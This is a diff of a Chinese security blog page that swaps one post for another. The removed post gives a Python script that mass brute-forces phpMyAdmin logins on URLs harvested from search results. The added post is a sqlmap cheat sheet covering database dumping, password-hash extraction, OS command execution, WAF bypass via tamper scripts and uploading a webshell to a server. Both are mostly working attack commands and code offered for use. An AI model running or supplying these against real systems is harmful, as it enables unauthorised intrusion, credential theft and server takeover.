@@ -4,10 +4,11 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="python批量爆破phpMyadmin, 星晴">
-    <meta name="description" content="使用python实现phpMyadmin的批量爆破0x01 脚本实现import requests
-from bs4 import BeautifulSoup as bp
-def attack(url,username,password):">
+    <meta name="keywords" content="sqlmap工具总结, 星晴">
+    <meta name="description" content="1. 三种注入方式检测get方式注入
+python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2
+post方式注入
+python2 sqlmap.py -u http://127">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +16,7 @@ def attack(url,username,password):">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>python批量爆破phpMyadmin | 星晴</title>
+    <title>sqlmap工具总结 | 星晴</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -259,13 +260,13 @@ def attack(url,username,password):">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        python批量爆破phpMyadmin
+                        sqlmap工具总结
                     </div>
                 </div>
             </div>
@@ -376,8 +377,8 @@ def attack(url,username,password):">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/python黑客编程/" target="_blank">
-                                <span class="chip bg-color">python黑客编程</span>
+                            <a href="/tags/渗透测试/" target="_blank">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
                     </div>
@@ -407,52 +408,53 @@ def attack(url,username,password):">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="使用python实现phpMyadmin的批量爆破"><a href="#使用python实现phpMyadmin的批量爆破" class="headerlink" title="使用python实现phpMyadmin的批量爆破"></a>使用python实现phpMyadmin的批量爆破</h2><h3 id="0x01-脚本实现"><a href="#0x01-脚本实现" class="headerlink" title="0x01 脚本实现"></a>0x01 脚本实现</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup <span class="token keyword">as</span> bp
-<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"</span><span class="token punctuation">}</span>
-    session<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        response<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-        soup<span class="token operator">=</span>bp<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>
-        my_Dict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"hidden"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">}</span>
-        tiqu<span class="token operator">=</span>soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>attrs<span class="token operator">=</span>my_Dict<span class="token punctuation">)</span>
-        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
-        data<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span><span class="token operator">=</span>tiqu<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> <span class="token string">"no token"</span>
-        data<span class="token punctuation">[</span><span class="token string">'pma_username'</span><span class="token punctuation">]</span><span class="token operator">=</span>username
-        data<span class="token punctuation">[</span><span class="token string">'pma_password'</span><span class="token punctuation">]</span><span class="token operator">=</span>password
-        index_url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"index.php"</span>
-        response1<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>index_url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-        htmls<span class="token operator">=</span>response1<span class="token punctuation">.</span>text
-        <span class="token keyword">if</span> <span class="token string">"phpMyAdmin is more friendly with a "</span> <span class="token keyword">in</span> htmls<span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] username:{0}, password:{1}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            <span class="token keyword">pass</span>
-    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
-        <span class="token keyword">pass</span>
-
-
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./Good.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> urls<span class="token punctuation">:</span>
-        host_t<span class="token operator">=</span>urls<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">for</span> url <span class="token keyword">in</span> host_t<span class="token punctuation">:</span>
-            <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'\n'</span><span class="token punctuation">:</span>
-                url<span class="token operator">=</span>url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-            <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"mima.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> mima<span class="token punctuation">:</span>
-                my_mima<span class="token operator">=</span>mima<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
-                <span class="token keyword">for</span> mima <span class="token keyword">in</span> my_mima<span class="token punctuation">:</span>
-                    username<span class="token punctuation">,</span>password<span class="token operator">=</span>mima<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span>
-                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"attack {0} use username:{1}|password:{2}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>
-                    attack<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
-
-</code></pre>
-<h3 id="0x02-脚本的使用"><a href="#0x02-脚本的使用" class="headerlink" title="0x02 脚本的使用"></a>0x02 脚本的使用</h3><ul>
-<li>先用批量采集工具采集url（关键词：“欢迎使用 phpMyadmin”）</li>
-<li>将采集的url导出为Good.txt路径</li>
-<li>然后密码的格式为:    root|toor  ，|左边为root,右边为toor</li>
-</ul>
+                <h2 id="1-三种注入方式检测"><a href="#1-三种注入方式检测" class="headerlink" title="1. 三种注入方式检测"></a>1. 三种注入方式检测</h2><p><code>get</code>方式注入</p>
+<pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2
+</code></pre><p><code>post</code>方式注入</p>
+<pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data uname=ha
+</code></pre><p><code>cookie</code>注入</p>
+<pre><code>python2 sqlmap.py -u &#39;网址&#39; --cookie uname=aja
+</code></pre><h2 id="2-数据库信息获取"><a href="#2-数据库信息获取" class="headerlink" title="2. 数据库信息获取"></a>2. 数据库信息获取</h2><p>获取当前用户下所有数据库</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; --dbs
+</code></pre><p>获取数据库的表名</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39;-D 数据库名 --tables
+</code></pre><p>获取表中的字段</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; -D 数据库名 -T 表名 --columns
+</code></pre><p>获取字段的内容</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; -D 数据库名 -T 表名 -C 列名，列名 --dump
+</code></pre><p>获取所有用户（具有一定的权限）</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; --users
+</code></pre><p>获取数据库用户的密码</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; --passwords
+</code></pre><p>获取当前网站数据库的名称</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; --current-db
+</code></pre><p>获取当前数据库的用户名称</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; --current-user
+</code></pre><p>获取数据库的数据量</p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; -D 数据库名 --count
+</code></pre><p>判断用户权限：增删改查、写入读取文件、执行系统命令</p>
+<pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --privileges
+</code></pre><p>简单的判断：<code>MSSQL</code>最高权限是<code>Sa</code>用户 <code>Mysql</code>最高权限是<code>root</code></p>
+<p><code>sqlmap</code>不支持<code>Mongodb</code>和<code>nosql</code>所以新出来的开源<code>nosqlmap</code>支持可以去<code>github</code>上下载</p>
+<p>管理自己的数据库得先在<code>github</code>上下载<code>pymysql</code>解压切换目录然后<code>setup.py install</code></p>
+<pre><code>sqlmap.py -d mysql://用户名:密码@地址：端口/数据库 --sql-shell 进行sql语句的管理
+</code></pre><p>页面无变化，布尔无真假，从来不报错，延时注入</p>
+<pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --delay -safe-freq
+</code></pre><p>交互式命令执行和写<code>webshell</code> </p>
+<pre><code>python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --os-cmd &#39;net user&#39;
+</code></pre><p>使用<code>tamper</code>绕过<code>waf</code></p>
+<pre><code>python2 sqlmap.py -u &#39;&#39; --tamper=&#39;&#39;
+</code></pre><p>批量<code>sql</code>注入</p>
+<pre><code>python2 sqlmap.py -m 文件
+</code></pre><h2 id="3-使用burpsuit批量扫描sql注入"><a href="#3-使用burpsuit批量扫描sql注入" class="headerlink" title="3. 使用burpsuit批量扫描sql注入"></a>3. 使用burpsuit批量扫描sql注入</h2><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bfr7oysj318t0swjtl.jpg" alt></p>
+<p>先在<code>burpsuit</code>中设置使用代理抓包并将其保存在<code>sqlmap</code>所在的目录下。然后使用</p>
+<pre><code>python2 sqlmap.py -l burp.log --batch -smart
+</code></pre><p><code>--batch</code> 就是使用默认选项，<code>smart</code>是使用智能化的注入，它会根据头的注入，<code>cookie</code>和<code>post</code>,<code>get</code>的方式进行注入</p>
+<h2 id="4-本地上传webshell"><a href="#4-本地上传webshell" class="headerlink" title="4. 本地上传webshell"></a>4. 本地上传webshell</h2><p>首先，在<code>sqlmap</code>所在的目录下创建一个目录<code>mst</code>，然后里面存放我们要上传的<code>webshell</code>,<br>其次，需要两个参数</p>
+<pre><code>--file-write &#39;./mst/mst.txt&#39;
+--file-dest &#39;d:/www/1.php&#39;
+-v 等级 可以显示出注入的payload
+</code></pre><p>使用<code>burpsuit</code>结合<code>sqlmap</code>学习注入：参数 <code>--proxy=http：//127.0.0.1：8080</code></p>
 
             </div>
             <hr>
@@ -600,7 +602,7 @@ def attack(url,username,password):">
                     </span>
                     <a href="http://yoursite.com" class="b-link-green">星晴</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/" class="b-link-green">python批量爆破phpMyadmin</a>
+                    <a href="/2019/04/12/sqlmap-gong-ju-zong-jie/" class="b-link-green">sqlmap工具总结</a>
                 </p>
             </div>
         </div>
@@ -625,19 +627,18 @@ def attack(url,username,password):">
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/">
+                <a href="/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="手写python爬虫下载电子书一键发送到kindle">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="matlab中mapminmax函数的总结">
                         
-                        <span class="card-title">手写python爬虫下载电子书一键发送到kindle</span>
+                        <span class="card-title">matlab中mapminmax函数的总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1.概述由于平时喜欢看书，但是发现一些推送的服务号没有自己想要的电子书，最近再学习爬虫，就想小试牛刀，主要用到的技术：
-使用python的requests模块进行网站信息的爬取
-解析我使用了两个方式，正则表达式和pyquery库进行html</div>
+                    <div class="summary">01 mapminmax()函数mapminmax()函数主要是用来对数据进行归一化处理的函数，它把所有的数据都转换为(0，1)之间的数，目的就是取消各维数据间的数量别差别，防止大数吃小数的现象。
+02 函数接口[Y,PS] = mapmi</div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-12
@@ -653,8 +654,8 @@ def attack(url,username,password):">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python爬虫/" target="_blank">
-                        <span class="chip bg-color">python爬虫</span>
+                    <a href="/tags/机器学习/" target="_blank">
+                        <span class="chip bg-color">机器学习</span>
                     </a>
                     
                 </div>
@@ -668,17 +669,19 @@ def attack(url,username,password):">
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/">
+                <a href="/2019/04/12/shi-yong-python-pa-qu-mao-yan-dian-ying/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="机器学习之线性回归方法">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="使用python爬虫爬取猫眼电影">
                         
-                        <span class="card-title">机器学习之线性回归方法</span>
+                        <span class="card-title">使用python爬虫爬取猫眼电影</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1. 多元线性回归以预测房子价格为例，房子的属性除了其面积大小外，这里还有房子楼层数、房子年龄、厅室数等。也就是说一个房子的特征将不只一个，而是多个。这里用n表示特征数目，x(i)表示的是训练集中第i个样本的特征向量，x(i)j表示的第i个</div>
+                    <div class="summary">1. 环境以及工具使用我们使用的是python3的requests库，requests比urllib更加的方便，同时使用正则表达式作为解析的工具。
+在工具方便这次我们使用一个新的抓包工具用来对http协议的包进行分析
+1.1 工具介绍Fid</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-12
@@ -694,8 +697,8 @@ def attack(url,username,password):">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/机器学习/" target="_blank">
-                        <span class="chip bg-color">机器学习</span>
+                    <a href="/tags/python爬虫/" target="_blank">
+                        <span class="chip bg-color">python爬虫</span>
                     </a>
                     
                 </div>
